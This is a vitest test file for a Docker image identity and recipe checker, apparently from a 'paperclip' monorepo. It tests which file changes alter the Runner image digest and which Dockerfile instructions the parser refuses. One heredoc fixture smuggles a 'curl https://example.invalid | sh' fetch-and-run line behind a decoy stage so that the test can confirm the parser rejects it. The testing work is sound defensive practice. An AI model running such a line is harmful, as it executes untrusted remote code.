import { chmodSync, mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { afterEach, describe, expect, it } from "vitest";
import { collectBuildInputFiles, computeBuildInputsDigest } from "../../../packages/paperclip-runner/scripts/build-inputs.mjs";
import {
  RUNNER_IMAGE_BUILD_INPUT_ROOTS,
  RUNNER_IMAGE_CONTEXT_INPUTS,
  RUNNER_IMAGE_INPUTS_SCHEMA,
  RUNNER_IMAGE_RECIPE_INPUTS,
  RUNNER_IMAGE_TARGET,
  computeContextTreeDigest,
  computeRunnerImageIdentity,
  extractRunnerImageRecipe,
  parseDockerfileStages,
} from "../../../scripts/runner-image-identity.mjs";

/**
 * The Runner image is published once per identity, under a create-only tag.
 * An identity that misses an input publishes a stale Runner under a new
 * build's name; one that covers too much rebuilds the Runner for changes that
 * cannot reach it.
 */

const repoRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..", "..", "..");
const dockerfile = readFileSync(path.join(repoRoot, "Dockerfile"), "utf8");
const BASE = "node:24.22.3-bookworm@sha256:";

const roots: string[] = [];
afterEach(() => {
  for (const root of roots.splice(0)) rmSync(root, { recursive: true, force: true });
});

function write(root: string, relative: string, content: string) {
  const file = path.join(root, ...relative.split("/"));
  mkdirSync(path.dirname(file), { recursive: true });
  writeFileSync(file, content);
}

/** A repository with the real Dockerfile and one small file for every kind of input. */
function repository(): string {
  const root = mkdtempSync(path.join(tmpdir(), "runner-image-identity-"));
  roots.push(root);
  write(root, "Dockerfile", dockerfile);
  write(root, ".dockerignore", "node_modules\n");
  for (const input of RUNNER_IMAGE_RECIPE_INPUTS) write(root, input, `recipe input ${input}\n`);
  for (const file of ["package.json", "pnpm-lock.yaml", "pnpm-workspace.yaml", "tsconfig.base.json"]) write(root, file, `${file}\n`);
  write(root, "packages/paperclip-runner/package.json", "{}\n");
  write(root, "packages/paperclip-runner/src/index.ts", "export const runner = 1;\n");
  write(root, "packages/paperclip-runner/runner/crates/runner-core/src/lib.rs", "pub fn runner() {}\n");
  write(root, "packages/paperclip-eval-kernel/src/index.ts", "export const kernel = 1;\n");
  write(root, "patches/acpx@0.22.0.patch", "patch\n");
  write(root, "ui/src/App.tsx", "export const app = 1;\n");
  write(root, "server/src/index.ts", "export const server = 1;\n");
  write(root, "packages/shared/src/index.ts", "export const shared = 1;\n");
  return root;
}

const digestOf = (root: string) => computeRunnerImageIdentity(root).digest as string;

function replaceInDockerfile(root: string, search: string, replacement: string) {
  expect(dockerfile).toContain(search);
  write(root, "Dockerfile", dockerfile.replace(search, replacement));
}

describe("Runner image identity", () => {
  it("reports the tag, the Runner build inputs, the recipe and the pinned base images", () => {
    const identity = computeRunnerImageIdentity(repository());
    expect(identity.schema).toBe(RUNNER_IMAGE_INPUTS_SCHEMA);
    expect(identity.digest).toMatch(/^[0-9a-f]{64}$/);
    expect(identity.tag).toBe(`inputs-${identity.digest}`);
    expect(identity.image).toBe("ghcr.io/paperclipai/paperclip-runner");
    expect(identity.platforms).toEqual(["linux/amd64", "linux/arm64"]);
    expect(identity.buildInputs.schema).toBe("paperclip.runner-build-inputs.v2");
    expect(identity.context.digest).toMatch(/^[0-9a-f]{64}$/);
    expect(identity.context.inputs).toEqual(RUNNER_IMAGE_CONTEXT_INPUTS);
    expect(identity.context.fileCount).toBeGreaterThan(10);
    expect(identity.recipe.target).toBe("runner-artifacts");
    expect(identity.baseImages).toHaveLength(1);
    expect(identity.baseImages[0]).toMatch(/^node:24\.\d+\.\d+-bookworm@sha256:[0-9a-f]{64}$/);
  });

  it("is the same for the same tree", () => {
    const root = repository();
    expect(digestOf(root)).toBe(digestOf(root));
    expect(digestOf(repository())).toBe(digestOf(root));
  });

  it.each([
    ["a Runner TypeScript source file", "packages/paperclip-runner/src/index.ts"],
    ["a Runner Rust source file", "packages/paperclip-runner/runner/crates/runner-core/src/lib.rs"],
    ["the eval kernel the Runner builds first", "packages/paperclip-eval-kernel/src/index.ts"],
    ["a dependency patch", "patches/acpx@0.22.0.patch"],
    ["the lockfile", "pnpm-lock.yaml"],
    ["the root manifest", "package.json"],
    ["the pnpm configuration", ".npmrc"],
    ["the pack archive script", "scripts/create-provider-pack-archive.mjs"],
    ["the layout script", "scripts/runner-image-layout.mjs"],
    ["the contract copy that build:typescript checks", "packages/shared/src/provider-failure.generated.ts"],
  ])("changes when %s changes", (_label, file) => {
    const root = repository();
    const before = digestOf(root);
    write(root, file, "changed\n");
    expect(digestOf(root)).not.toBe(before);
  });

  it.each([
    ["a UI source file", "ui/src/App.tsx"],
    ["a server source file", "server/src/index.ts"],
    ["another package's source file", "packages/shared/src/index.ts"],
    ["a new file outside the Runner's inputs", "server/src/services/new-service.ts"],
  ])("does not change when %s changes", (_label, file) => {
    const root = repository();
    const before = digestOf(root);
    write(root, file, "changed\n");
    expect(digestOf(root)).toBe(before);
  });

  describe("context tree", () => {
    // The Runner's build-input digest skips dot-directories and any directory
    // named dist, and it does not read file modes. The image build copies
    // those paths and modes all the same, so the identity must see them.
    it.each([
      ["a file in a dot-directory", "packages/paperclip-runner/runner/.cargo/config.toml"],
      ["a file in a directory named dist", "packages/paperclip-runner/src/vendor/dist/bundle.js"],
    ])("changes for %s, which the Runner build-input digest does not read", (_label, file) => {
      const root = repository();
      const before = computeRunnerImageIdentity(root);
      write(root, file, "[build]\n");
      const after = computeRunnerImageIdentity(root);
      expect(after.buildInputs.digest).toBe(before.buildInputs.digest);
      expect(after.context.digest).not.toBe(before.context.digest);
      expect(after.digest).not.toBe(before.digest);
      write(root, file, "[build]\njobs = 2\n");
      expect(digestOf(root)).not.toBe(after.digest);
    });

    it("changes when only the executable bit of a file changes", () => {
      const root = repository();
      const file = path.join(root, "packages/paperclip-runner/scripts/provision.sh");
      write(root, "packages/paperclip-runner/scripts/provision.sh", "#!/bin/sh\n");
      chmodSync(file, 0o644);
      const before = computeRunnerImageIdentity(root);
      chmodSync(file, 0o755);
      const after = computeRunnerImageIdentity(root);
      expect(computeBuildInputsDigest(root).digest).toBe(before.buildInputs.digest);
      expect(after.digest).not.toBe(before.digest);
      chmodSync(file, 0o644);
      expect(digestOf(root)).toBe(before.digest);
    });

    it("records a symbolic link by its target and does not follow it", () => {
      const root = repository();
      const link = path.join(root, "packages/paperclip-runner/current");
      symlinkSync("src", link);
      const before = digestOf(root);
      rmSync(link);
      symlinkSync("../../server/src", link);
      const after = digestOf(root);
      expect(after).not.toBe(before);
      // The link's target is outside the inputs, and its content is not read.
      write(root, "server/src/index.ts", "changed\n");
      expect(digestOf(root)).toBe(after);
    });

    it("changes when a file is added, removed or renamed", () => {
      const root = repository();
      const before = digestOf(root);
      write(root, "packages/paperclip-eval-kernel/src/extra.ts", "export {};\n");
      const added = digestOf(root);
      expect(added).not.toBe(before);
      rmSync(path.join(root, "packages/paperclip-eval-kernel/src/extra.ts"));
      expect(digestOf(root)).toBe(before);
      write(root, "packages/paperclip-eval-kernel/src/other.ts", "export {};\n");
      expect(digestOf(root)).not.toBe(added);
    });

    it("does not depend on the order the directory lists its entries in", () => {
      const one = repository();
      const two = repository();
      for (const name of ["b.ts", "Z.ts", "a.ts", "_c.ts"]) write(one, `packages/paperclip-runner/src/${name}`, "x\n");
      for (const name of ["_c.ts", "a.ts", "Z.ts", "b.ts"]) write(two, `packages/paperclip-runner/src/${name}`, "x\n");
      expect(computeContextTreeDigest(one)).toEqual(computeContextTreeDigest(two));
    });
  });

  describe(".dockerignore", () => {
    // Its rules decide which files the build receives, and nothing else. The
    // identity is computed inside the build, from the files it received.
    it("does not change the identity when its text changes and the received files do not", () => {
      const root = repository();
      const before = digestOf(root);
      write(root, ".dockerignore", "node_modules\nui/dist\nserver/tmp\n");
      expect(digestOf(root)).toBe(before);
      rmSync(path.join(root, ".dockerignore"));
      expect(digestOf(root)).toBe(before);
    });

    it("changes the identity when a rule removes a file from the Runner's context", () => {
      const root = repository();
      write(root, "packages/paperclip-runner/styles.css", "body {}\n");
      const before = digestOf(root);
      // What a new `packages/paperclip-runner/styles.css` rule does to the build context.
      rmSync(path.join(root, "packages/paperclip-runner/styles.css"));
      expect(digestOf(root)).not.toBe(before);
    });

    it("is not copied into any recipe stage", () => {
      expect(extractRunnerImageRecipe(dockerfile).contextPaths).not.toContain(".dockerignore");
      expect(RUNNER_IMAGE_CONTEXT_INPUTS).not.toContain(".dockerignore");
    });
  });

  it("changes when a recipe stage changes", () => {
    const root = repository();
    const before = digestOf(root);
    replaceInDockerfile(root, "    pnpm run build:binary; \\\n", "    pnpm run build:binary; \\\n    true; \\\n");
    expect(digestOf(root)).not.toBe(before);
  });

  it("changes when a base image digest changes", () => {
    const root = repository();
    const before = computeRunnerImageIdentity(root);
    const pinned = before.baseImages[0] as string;
    const moved = `${pinned.slice(0, pinned.indexOf("@sha256:"))}@sha256:${"a".repeat(64)}`;
    replaceInDockerfile(root, pinned, moved);
    const after = computeRunnerImageIdentity(root);
    expect(after.baseImages).toEqual([moved]);
    expect(after.digest).not.toBe(before.digest);
  });

  it("changes when a pinned toolchain installer changes", () => {
    const root = repository();
    const before = digestOf(root);
    const stage = parseDockerfileStages(dockerfile).stages.find((entry) => entry.name === "runner-artifacts-toolchain")!;
    const pin = /ARG RUSTUP_SHA256_AMD64=[0-9a-f]{64}/.exec(stage.text)?.[0] as string;
    write(root, "Dockerfile", dockerfile.replace(stage.text, stage.text.replace(pin, `ARG RUSTUP_SHA256_AMD64=${"b".repeat(64)}`)));
    expect(digestOf(root)).not.toBe(before);
  });

  it("does not change when a stage the Runner is not built from changes", () => {
    const root = repository();
    const before = digestOf(root);
    replaceInDockerfile(root, "FROM base AS production\n", "FROM base AS production\nRUN echo application-only\n");
    expect(digestOf(root)).toBe(before);
    // The comment that introduces the next stage follows the last Runner
    // instruction, but it is not part of the Runner's recipe.
    replaceInDockerfile(root, "\nFROM base AS production\n", "\n# A new note about the production stage.\nFROM base AS production\n");
    expect(digestOf(root)).toBe(before);
  });

  it("changes with the Runner build inputs digest and nothing else of it", () => {
    const root = repository();
    const buildInputs = { schema: "paperclip.runner-build-inputs.v2", digest: "1".repeat(64) };
    const one = computeRunnerImageIdentity(root, { buildInputs });
    const counted = { ...buildInputs, fileCount: 9, byteCount: 9 };
    expect(computeRunnerImageIdentity(root, { buildInputs: counted }).digest).toBe(one.digest);
    expect(computeRunnerImageIdentity(root, { buildInputs: { ...buildInputs, digest: "2".repeat(64) } }).digest).not.toBe(one.digest);
  });

  it("refuses a recipe input that is missing from the build context", () => {
    const root = repository();
    rmSync(path.join(root, "scripts/create-provider-pack-archive.mjs"));
    expect(() => computeRunnerImageIdentity(root)).toThrow(/scripts\/create-provider-pack-archive\.mjs, which is missing/);
  });
});

describe("Runner image recipe", () => {
  const recipe = extractRunnerImageRecipe(dockerfile);
  const { stages } = parseDockerfileStages(dockerfile);
  const names = stages.map((stage) => stage.name ?? "");
  const stageNamed = (name: string) => stages.find((stage) => stage.name === name)!;

  it("is built only from its own stages", () => {
    const recipeStages = recipe.stages.map((stage) => stage.name);
    expect(recipeStages).toEqual([
      "runner-artifacts-context",
      "runner-artifacts-node",
      "runner-artifacts-identity-compute",
      "runner-artifacts-identity",
      "runner-artifacts-toolchain",
      "runner-artifacts-runnerd",
      "runner-artifacts-build",
      "runner-artifacts",
    ]);
    // Not the application build: none of these may reach the Runner image.
    for (const name of ["base", "deps", "runner-build", "build", "runner-provider-pack", "production", "cloud"]) {
      expect(names).toContain(name);
      expect(recipeStages).not.toContain(name);
    }
  });

  it("ends in a file tree with no base image", () => {
    const target = stageNamed(RUNNER_IMAGE_TARGET);
    expect(target.from).toBe("scratch");
    expect(target.text.trim().split("\n")).toEqual(["FROM scratch AS runner-artifacts", "COPY --from=runner-artifacts-build /out/ /"]);
  });

  it("pins every base image by digest", () => {
    expect(recipe.baseImages).toHaveLength(1);
    expect(recipe.baseImages[0].startsWith(BASE)).toBe(true);
    const unpinned = dockerfile.replace(/(FROM node:24\.22\.3-bookworm)@sha256:[0-9a-f]{64}( AS runner-artifacts-node)/, "$1$2");
    expect(unpinned).not.toBe(dockerfile);
    expect(() => extractRunnerImageRecipe(unpinned)).toThrow(/not pinned by digest: node:24\.22\.3-bookworm/);
    // The application image's base floats; the Runner must not inherit it.
    const inherited = dockerfile.replace("FROM runner-artifacts-node AS runner-artifacts-toolchain", "FROM base AS runner-artifacts-toolchain");
    expect(() => extractRunnerImageRecipe(inherited)).toThrow(/not pinned by digest: node:24-trixie-slim/);
  });

  it("copies from the build context exactly what the identity covers", () => {
    // The script refuses a COPY of anything else (see the refusals below), so
    // the list it returns is the whole of what the stages copy.
    expect(recipe.contextPaths).toEqual(["Dockerfile", ...RUNNER_IMAGE_CONTEXT_INPUTS].sort());
  });

  describe("refuses a recipe it cannot account for", () => {
    const context = "FROM scratch AS runner-artifacts-context\n";
    const build = "FROM runner-artifacts-runnerd AS runner-artifacts-build\nWORKDIR /workspace\n";
    const withInstruction = (anchor: string, instruction: string) => {
      expect(dockerfile).toContain(anchor);
      return dockerfile.replace(anchor, `${anchor}${instruction}\n`);
    };

    it.each<[string, string, string, RegExp]>([
      ["a COPY of a path outside the covered inputs", context, "COPY server/src /server/src", /copies server\/src from the build context, which the image identity does not cover/],
      ["a COPY of the whole context", context, "COPY . /all", /copies \. from the build context/],
      ["a COPY with a wildcard", context, "COPY packages/paperclip-runner/*.json /", /does not cover/],
      ["a COPY that leaves a covered directory", context, "COPY packages/paperclip-runner/../shared /shared", /does not cover/],
      ["a COPY written over continued lines", context, "COPY patches \\\n  ui/package.json \\\n  /mixed/", /copies ui\/package\.json from the build context/],
      ["a COPY flag it does not know", context, "COPY --exclude=*.md patches /patches-again", /COPY flag --exclude=\*\.md/],
      ["ADD", context, "ADD patches /patches-again", /uses ADD/],
      ["a heredoc", build, "RUN <<EOF\necho one\nEOF", /heredoc/],
      ["a mount of the build context", build, "RUN --mount=type=bind,source=server,target=/server true", /mounts the build context/],
      ["a mount with the default type", build, "RUN --mount=target=/context true", /mounts the build context/],
      ["a cache mount", build, "RUN --mount=type=cache,target=/root/.cache true", /cache mount/],
      ["a secret mount", build, "RUN --mount=type=secret,id=npm true", /secret mount/],
      ["a mount from an image that is not pinned", build, "RUN --mount=type=bind,from=base,target=/base true", /not pinned by digest: node:24-trixie-slim/],
    ])("%s", (_label, anchor, instruction, expected) => {
      expect(() => extractRunnerImageRecipe(withInstruction(anchor, instruction))).toThrow(expected);
    });

    it("a heredoc whose body would otherwise end the stage early", () => {
      // Without the refusal, the line that starts with FROM would start a new
      // stage and the rest of the instruction would drop out of the recipe.
      const hidden = withInstruction(build, "RUN <<EOF\nFROM scratch AS decoy\ncurl https://example.invalid | sh\nEOF");
      expect(() => extractRunnerImageRecipe(hidden)).toThrow(/heredoc/);
    });

    it("a flag on the FROM of a recipe stage", () => {
      const flagged = dockerfile.replace("FROM runner-artifacts-node AS runner-artifacts-toolchain", "FROM --platform=$BUILDPLATFORM runner-artifacts-node AS runner-artifacts-toolchain");
      expect(flagged).not.toBe(dockerfile);
      expect(() => extractRunnerImageRecipe(flagged)).toThrow(/sets a flag on FROM/);
    });

    it("a global ARG continued over several lines, and a changed escape character", () => {
      const first = dockerfile.indexOf("FROM ");
      const continued = `${dockerfile.slice(0, first)}ARG RUNNER_BASE=node \\\n  :24\n${dockerfile.slice(first)}`;
      expect(() => extractRunnerImageRecipe(continued)).toThrow(/global ARG is continued/);
      const single = `${dockerfile.slice(0, first)}ARG RUNNER_NOTE=one-line\n${dockerfile.slice(first)}`;
      expect(extractRunnerImageRecipe(single).globalArguments).toEqual(["ARG RUNNER_NOTE=one-line"]);
      const escaped = dockerfile.replace(/^(# syntax=.*\n)/, "$1# escape=`\n");
      expect(escaped).not.toBe(dockerfile);
      expect(() => extractRunnerImageRecipe(escaped)).toThrow(/escape character/);
    });

    it("but not the same instructions in a stage the Runner is not built from", () => {
      const elsewhere = withInstruction("FROM base AS production\n", "ADD https://example.invalid/tool /tool\nRUN --mount=type=cache,target=/root/.npm true\nCOPY ui /ui");
      expect(extractRunnerImageRecipe(elsewhere).contextPaths).toEqual(recipe.contextPaths);
    });

    it("the identity computation itself, not only the parser", () => {
      const root = repository();
      write(root, "Dockerfile", withInstruction(context, "COPY server/src /server/src"));
      expect(() => computeRunnerImageIdentity(root)).toThrow(/does not cover/);
    });
  });

  it("lists as build inputs exactly the paths the Runner build-input digest reads", () => {
    const root = repository();
    const covered: string[] = collectBuildInputFiles(root);
    for (const file of covered) {
      expect(RUNNER_IMAGE_BUILD_INPUT_ROOTS.some((entry: string) => file === entry || file.startsWith(`${entry}/`)), file).toBe(true);
    }
    for (const entry of RUNNER_IMAGE_BUILD_INPUT_ROOTS) {
      expect(covered.some((file) => file === entry || file.startsWith(`${entry}/`)), entry).toBe(true);
    }
  });

  it("keeps the default build target and the application stages as they were", () => {
    // `docker build .` builds the last stage. The Runner stages sit before it.
    expect(names.at(-1)).toBe("cloud");
    expect(names.indexOf("runner-artifacts")).toBeLessThan(names.indexOf("production"));
    // No application stage reads the Runner image in this phase.
    for (const stage of stages) {
      if (stage.name?.startsWith("runner-artifacts")) continue;
      expect(stage.text, stage.name ?? "").not.toMatch(/runner-artifacts/);
    }
  });

  it("runs every output step of the Runner's own build, and knows every other step", () => {
    // The image build runs the steps of the Runner's `build` script that write
    // build output, between the two that record the build stamp. This list is
    // the whole script: a new step fails here until someone decides whether
    // the image build must run it too.
    const manifest = JSON.parse(readFileSync(path.join(repoRoot, "packages/paperclip-runner/package.json"), "utf8"));
    expect((manifest.scripts.build as string).split(" && ")).toEqual([
      "node scripts/record-build-inputs.mjs --begin",
      "pnpm run check:protocol-manifest",
      "pnpm run build:typescript",
      "pnpm run check:capability-contract",
      "pnpm run check:capability-inventory",
      "pnpm run check:protocol-coverage",
      "node scripts/generate-semantic-contracts.mjs --check",
      "node scripts/check-runner-workflow-traceability.mjs",
      "pnpm run build:binary",
      "node scripts/generate-replay-goldens.mjs --check",
      "node scripts/generate-semantic-action-catalog.mjs --check",
      "node scripts/record-build-inputs.mjs --finish",
    ]);
    const build = stageNamed("runner-artifacts-build").text;
    const order = [
      "node scripts/record-build-inputs.mjs --begin;",
      "pnpm run build:typescript;",
      "pnpm run build:binary;",
      "node scripts/record-build-inputs.mjs --finish;",
      "node packages/paperclip-runner/scripts/build-provider-pack.mjs /out/provider-pack;",
      "node scripts/create-provider-pack-archive.mjs /out/provider-pack;",
      "node scripts/runner-image-layout.mjs write ",
      "chmod -R a+rX /out;",
      'node scripts/runner-image-layout.mjs check /out --expect-source-revision "$revision";',
    ].map((step) => build.indexOf(step));
    expect(order.every((index) => index >= 0)).toBe(true);
    expect([...order].sort((a, b) => a - b)).toEqual(order);
    expect(build).toContain("pnpm install --frozen-lockfile --filter '@paperclipai/paperclip-runner...'");
    // The only mention of a resolving install is the hint the failure prints.
    expect(build).not.toMatch(/--no-frozen-lockfile(?!")/);
  });
});
